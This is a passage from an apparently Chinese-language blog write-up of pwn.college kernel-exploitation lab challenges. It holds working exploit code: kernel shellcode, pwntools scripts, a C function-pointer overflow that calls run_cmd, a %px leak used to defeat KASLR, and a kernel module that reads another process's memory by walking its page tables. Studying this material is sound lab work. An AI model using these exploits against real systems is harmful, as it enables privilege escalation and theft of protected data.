<br>#\x48\x31\xff\x48\xc7\xc1\xd0\x90\x08\x81\xff\xd1\x48\x89\xc7\x48\xc7\xc1\x90\x8d\x08\x81\xff\xd1\x65\x48\x8b\x04\x25\x00\x5d\x01\x00\x48\x81\x20\xff\xfe\xff\xff\x31\xc0\xc3<br></code></pre></td></tr></table></figure><p>这里手写用户态shellcode较繁琐，并且需要和用户态程序交互，使用<code>pwntools</code>会方便很多。</p><p>exp(python)：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br>io = process(<span class="hljs-string">&#x27;/challenge/babykernel_level8.0&#x27;</span>)<br><br>ksc = <span class="hljs-string">b&#x27;\x48\x31\xff\x48\xc7\xc1\xd0\x90\x08\x81\xff\xd1\x48\x89\xc7\x48\xc7\xc1\x90\x8d\x08\x81\xff\xd1\x65\x48\x8b\x04\x25\x00\x5d\x01\x00\x48\x81\x20\xff\xfe\xff\xff\x31\xc0\xc3&#x27;</span><br>shellcode = shellcraft.amd64.write(<span class="hljs-number">3</span>,ksc,<span class="hljs-built_in">len</span>(ksc)) <br>shellcode += shellcraft.amd64.linux.cat(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-number">1</span>) <span class="hljs-comment">#fd = open(&#x27;/flag&#x27;,0) sendfile(1,fd,length)</span><br>usc = asm(shellcode)<br><br>io.sendline(usc)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><h3 id="level9-0-amp-level9-1"><a href="#level9-0-amp-level9-1" class="headerlink" title="level9.0 &amp; level9.1"></a>level9.0 &amp; level9.1</h3><p>内核态缓冲区溢出</p><p>可以从用户态的buffer向v11传入0x108字节的数据，v11的大小为0x100，多出的8字节可以覆盖函数指针v12。将v12覆盖为<code>run_cmd</code>函数，就可以执行buffer中的命令。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">_BYTE v11[<span class="hljs-number">256</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-120h] BYREF</span><br><span class="hljs-type">void</span> (__fastcall *v12)(_BYTE *); <span class="hljs-comment">// [rsp+100h] [rbp-20h]</span><br>v8 = v11;<br><span class="hljs-keyword">while</span> ( v6 )<br>&#123;<br>  *v8++ = <span class="hljs-number">0</span>;<br>  --v6;<br>&#125;<br>printk(&amp;unk_540, file, buffer, length, offset);<br>v12 = (<span class="hljs-type">void</span> (__fastcall *)(_BYTE *))&amp;printk;<br><span class="hljs-keyword">if</span> ( length &gt; <span class="hljs-number">0x108</span> )<br>&#123;<br>  _warn_printk(<span class="hljs-string">&quot;Buffer overflow detected (%d &lt; %lu)!\n&quot;</span>, <span class="hljs-number">264LL</span>, length);<br>  BUG();<br>&#125;<br>v9 = copy_from_user(v11, buffer, length);<br>v12(v11);<br></code></pre></td></tr></table></figure><p>寻找run_cmd地址</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">hacker@vm_practice~kernel-security~level9-0:~$ sudo cat /proc/kallsyms | grep run_cmd<br>ffffffff81089580 t run_cmd<br></code></pre></td></tr></table></figure><p>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>,O_RDWR);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,fd);<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> run_cmd = <span class="hljs-number">0xffffffff81089580</span>;<br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">0x108</span>] = <span class="hljs-string">&quot;/usr/bin/chmod +777 /flag&quot;</span>;<br>    <span class="hljs-built_in">memset</span>(buffer+<span class="hljs-number">26</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x108</span><span class="hljs-number">-26</span>);<br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)&amp;buffer[<span class="hljs-number">0x100</span>] = run_cmd;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> length = <span class="hljs-number">0x108</span>;<br>    write(fd,buffer,length);<br>    close(fd);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>或使用<code>pwntools</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(<span class="hljs-string">b&quot;/usr/bin/chmod +777 /flag&quot;</span> + <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">231</span> +p64(<span class="hljs-number">0xffffffff81089580</span>))<br></code></pre></td></tr></table></figure><h3 id="level10-0-amp-level10-1"><a href="#level10-0-amp-level10-1" class="headerlink" title="level10.0 &amp; level10.1"></a>level10.0 &amp; level10.1</h3><p>描述:Exploit a buggy kernel device with KASLR enabled to get the flag!</p><p>内核模块源码和上一题相同，但是开启了<code>kASLR</code>，所以在run_cmd之前需要泄露内核地址计算内核基址的kaslr偏移。</p><p>在不溢出的情况下，v12是<code>printk</code>，参数自定义，可通过<code>%px</code>泄露栈上的内核地址（注意<code>%p</code>和<code>%pk</code>都只泄露内核符号的哈希散列值而不是真实地址）。 </p><p>分别在未开启kASLR的level9.0和开启kASLR的level10.0运行以下脚本后执行<code>dmesg</code>查看内核日志，发现都存在<code>b6309</code>结尾的内核地址，并且该地址每次运行脚本都不变，可知该地址相对内核加载基址的偏移是固定的，那么相减即可得到<code>kASLR的偏移</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(<span class="hljs-string">b&quot; %px\n&quot;</span> *<span class="hljs-number">40</span>)<br><br><span class="hljs-comment">#kaslr_addr: xxxxxxxxxxxb9609</span><br><span class="hljs-comment">#nokaslr_addr :ffffffff810b6309</span><br><span class="hljs-comment">#random_offset = kaslr_addr - nokaslr_addr</span><br></code></pre></td></tr></table></figure><p>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>,O_RDWR);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,fd);<br>    <span class="hljs-type">int</span> random_offset = ????????<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> run_cmd = <span class="hljs-number">0xffffffff81089580</span> + random_offset;<br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">0x108</span>] = <span class="hljs-string">&quot;/usr/bin/chmod +777 /flag&quot;</span>;<br>    <span class="hljs-built_in">memset</span>(buffer+<span class="hljs-number">26</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x108</span><span class="hljs-number">-26</span>);<br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)&amp;buffer[<span class="hljs-number">0x100</span> ] = run_cmd;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> length = <span class="hljs-number">0x108</span>;<br>    write(fd,buffer,length);<br>    close(fd);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>或使用<code>pwntools</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>random_offset = ????????<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/proc/pwncollege&quot;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(<span class="hljs-string">b&quot;/usr/bin/chmod +777 /flag&quot;</span> + <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">231</span> +p64(<span class="hljs-number">0xffffffff81089580</span> + random_offset))<br></code></pre></td></tr></table></figure><h3 id="level11-0-amp-level11-1"><a href="#level11-0-amp-level11-1" class="headerlink" title="level11.0 &amp; level11.1"></a>level11.0 &amp; level11.1</h3><p>未开启<code>kASLR</code>和<code>smap</code></p><p>用户态程序流程：</p><ul><li>在<code>load_flag</code>函数中使用<code>fork</code>创建了子进程。子进程读取flag，向主进程发送信号，然后保持休眠；主进程等待子进程的信号，收到信号继续执行。</li><li><code>unlink</code>函数删除&#x2F;flag文件。</li><li>开启seccomp沙箱只允许write系统调用。</li><li>执行用户态shellcode。</li></ul><p>用户态存在进程间内存隔离，父进程和子进程不共享虚拟内存空间(除非人为映射共享内存)，因此父进程shellcode无法直接读取子进程bss段的flag。</p><p>思路：由于未开启<code>SMAP</code>保护，内核能够读写所有用户态进程内存，我们需要在子进程挂起后于内核态进行如下操作：</p><ul><li>通过子进程pid(父进程pid+1)获得其<code>task_struct</code>。</li><li>通过<code>task_struct</code>获取<code>mm_strcut</code>，该结构体中存储了最高级页表的首地址。</li><li>通过<code>mm_strcut</code>获取最高级页表首地址。</li><li>通过子进程中的虚拟内存地址和子进程的最高级页表地址递推出内存物理地址。</li><li>将内存物理地址通过<code>kmmap</code>映射到内核空间，在内核空间进行读写。</li></ul><p>具体编程可参考<a href="http://edsionte.com/techblog/archives/1966">文章1</a>和<a href="https://blog.csdn.net/vs2008ASPNET/article/details/115294859">文章2</a></p><p>装载以下源码编译的内核模块后，会在内核日志输出flag</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//vir_to_phy.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/init.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/module.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/fs.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/uaccess.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/pid.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;asm/pgtable.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/highmem.h&gt;</span></span><br><br>MODULE_LICENSE(<span class="hljs-string">&quot;GPL&quot;</span>); <br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> major_number;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">device_open</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *inode, <span class="hljs-keyword">struct</span> file *filp)</span><br>&#123;<br>    printk(KERN_ALERT <span class="hljs-string">&quot;Device opened.&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">device_release</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *inode, <span class="hljs-keyword">struct</span> file *filp)</span><br>&#123;<br>    printk(KERN_ALERT <span class="hljs-string">&quot;Device closed.&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">device_read</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp, <span class="hljs-type">char</span> *buffer, <span class="hljs-type">size_t</span> length, <span class="hljs-type">loff_t</span> *offset)</span><br>&#123;<br><span class="hljs-type">char</span> *msg = <span class="hljs-string">&quot;Hello pwn.college!\n&quot;</span>;<br><span class="hljs-keyword">return</span> copy_to_user(buffer, msg, <span class="hljs-built_in">strlen</span>(msg)) ? -EFAULT : <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">device_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> len, <span class="hljs-type">loff_t</span> *off)</span><br>&#123;<br>  printk(KERN_ALERT <span class="hljs-string">&quot;Sorry, this operation isn&#x27;t supported.\n&quot;</span>);<br>  <span class="hljs-keyword">return</span> -EINVAL;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">fops</span> =</span> &#123;<br>  .read = device_read,<br>  .write = device_write,<br>  .open = device_open,<br>  .release = device_release<br>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">init_module</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  major_number = register_chrdev(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;pwn-college-char&quot;</span>, &amp;fops);<br><br>  <span class="hljs-keyword">if</span> (major_number &lt; <span class="hljs-number">0</span>) &#123;<br>    printk(KERN_ALERT <span class="hljs-string">&quot;Registering char device failed with %d\n&quot;</span>, major_number);<br>    <span class="hljs-keyword">return</span> major_number;<br>  &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pid</span> * <span class="hljs-title">kpid</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span> *<span class="hljs-title">task</span>;</span><br><span class="hljs-type">char</span> task_name[TASK_COMM_LEN] = &#123;<span class="hljs-number">0</span>&#125;;<br><br>kpid = find_get_pid(<span class="hljs-number">169</span>);<br>task = get_pid_task(kpid,PIDTYPE_PID);<br><br>    printk(KERN_INFO <span class="hljs-string">&quot;task_name = %s, task_pid = %d\n&quot;</span>,get_task_comm(task_name,task),task-&gt;pid);<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> v_address = <span class="hljs-number">0x404040</span>;<br><span class="hljs-type">pgd_t</span>* pgde;<br><span class="hljs-type">p4d_t</span>* p4de;<br><span class="hljs-type">pud_t</span>* pude;<br><span class="hljs-type">pmd_t</span>* pmde;<br><span class="hljs-type">pte_t</span>* pte;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> task-&gt;mm;<br>pgde = pgd_offset(mm,v_address); <br><br>p4de = p4d_offset(pgde,v_address);<br><br>pude = pud_offset(p4de,v_address); <br><br>pmde = pmd_offset(pude,v_address);<br><br>pte = pte_offset_kernel(pmde,v_address);<br><br><span class="hljs-type">unsigned</span> pte_addr = pte_val(*pte);<br>printk(KERN_INFO <span class="hljs-string">&quot;pte_val = 0x%lx\n&quot;</span>,pte_addr);<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> page_addr = pte_val(*pte) &amp; PAGE_MASK;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> page_offset = v_address &amp; ~PAGE_MASK;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> phy_addr = page_addr | page_offset;<br>printk(KERN_INFO <span class="hljs-string">&quot;page_addr = 0x%lx, page_offset = 0x%lx\n&quot;</span>,page_addr,page_offset);<br>printk(KERN_INFO <span class="hljs-string">&quot;v_address = 0x%lx, phy_addr = 0x%lx\n&quot;</span>,v_address,phy_addr);<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> PT_addr = pte_page(*pte);<br>printk(KERN_INFO <span class="hljs-string">&quot;PT_addr = %lx\n&quot;</span>,PT_addr);<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> vptr=kmap(PT_addr);<br>printk(KERN_INFO <span class="hljs-string">&quot;vptr = 0x%lx, mapped_vaddress = 0x%lx\n&quot;</span>,vptr,vptr+page_offset);<br><br><span class="hljs-type">char</span> *flag = (<span class="hljs-type">char</span> *)(vptr+page_offset);<br>printk(KERN_INFO <span class="hljs-string">&quot;flag : %s\n&quot;</span>,flag);<br><br>kunmap(page_addr);<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> father_phy_addr = virt_to_phys(v_address);<br>printk(KERN_INFO <span class="hljs-string">&quot;father_phy_addr = 0x%lx&quot;</span>,father_phy_addr);<br><br>  printk(KERN_INFO <span class="hljs-string">&quot;I was assigned major number %d.\n&quot;</span>, major_number);<br>  printk(KERN_INFO <span class="hljs-string">&quot;Create device with: &#x27;mknod /dev/pwn-college-char c %d 0&#x27;.\n&quot;</span>, major_number);<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">cleanup_module</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  unregister_chrdev(major_number, <span class="hljs-string">&quot;pwn-college-char&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">[ 1712.649027] task_name = babykernel_leve, task_pid = 170<br>[ 1712.654021] pte_val = 0x7c094067<br>[ 1712.654849] page_addr = 0x800000007c094000, page_offset = 0x40<br>[ 1712.656246] v_address = 0x404040, phy_addr = 0x800000007c094040<br>[ 1712.657646] PT_addr = ffffea0001f02500<br>[ 1712.658635] vptr = 0xffff88807c094000, mapped_vaddress = 0xffff88807c094040<br>[ 1712.660336] flag : pwn.college&#123;practice&#125;<br><br>[ 1712.661611] father_phy_addr = 0x778000404040<br></code></pre></td></tr></table></figure><p>将模块代码简化后编译，配合<code>objdump</code>反编译查看汇编，方便内核shellcode编写。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//v2p.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/init.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/module.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/fs.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/uaccess.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/pid.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;asm/pgtable.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/highmem.h&gt;</span></span><br><br>MODULE_LICENSE(<span class="hljs-string">&quot;GPL&quot;</span>); <br><br><span class="hljs-type">void</span> <span class="hljs-title function_">test_func</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;<br><span class="hljs-comment">//int init_module(void)&#123;</span><br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pid</span> * <span class="hljs-title">kpid</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span> *<span class="hljs-title">task</span>;</span><br><span class="hljs-comment">//char task_name[TASK_COMM_LEN] = &#123;0&#125;;</span><br><br><span class="hljs-type">pid_t</span> current_pid = current -&gt; pid;<br><span class="hljs-comment">//printk(KERN_INFO &quot;current_pid = %d\n&quot;,current_pid);</span><br><br>kpid = find_get_pid(current_pid+<span class="hljs-number">1</span>);<br>task = get_pid_task(kpid,PIDTYPE_PID);<br><br>    <span class="hljs-comment">//printk(KERN_INFO &quot;task_name = %s, task_pid = %d\n&quot;,get_task_comm(task_name,task),task-&gt;pid);</span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> v_address = <span class="hljs-number">0x404040</span>;<br><span class="hljs-type">pgd_t</span>* pgde;<br><span class="hljs-type">p4d_t</span>* p4de;<br><span class="hljs-type">pud_t</span>* pude;<br><span class="hljs-type">pmd_t</span>* pmde;<br><span class="hljs-type">pte_t</span>* pte;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> task-&gt;mm;<br>pgde = pgd_offset(mm,v_address); <br><br>p4de = p4d_offset(pgde,v_address);<br><br>pude = pud_offset(p4de,v_address); <br><br>pmde = pmd_offset(pude,v_address);<br><br>pte = pte_offset_kernel(pmde,v_address);<br><br><span class="hljs-comment">//unsigned pte_addr = pte_val(*pte);</span><br><span class="hljs-comment">//printk(KERN_INFO &quot;pte_val = 0x%lx\n&quot;,pte_addr);</span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> page_addr = pte_val(*pte) &amp; PAGE_MASK;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> page_offset = v_address &amp; ~PAGE_MASK;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> phy_addr = page_addr | page_offset;<br><span class="hljs-comment">//printk(KERN_INFO &quot;page_addr = 0x%lx, page_offset = 0x%lx\n&quot;,page_addr,page_offset);</span><br><span class="hljs-comment">//printk(KERN_INFO &quot;v_address = 0x%lx, phy_addr = 0x%lx\n&quot;,v_address,phy_addr);</span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> PT_addr = pte_page(*pte);<br><span class="hljs-comment">//printk(KERN_INFO &quot;PT_addr = %lx\n&quot;,PT_addr);</span><br><br><span 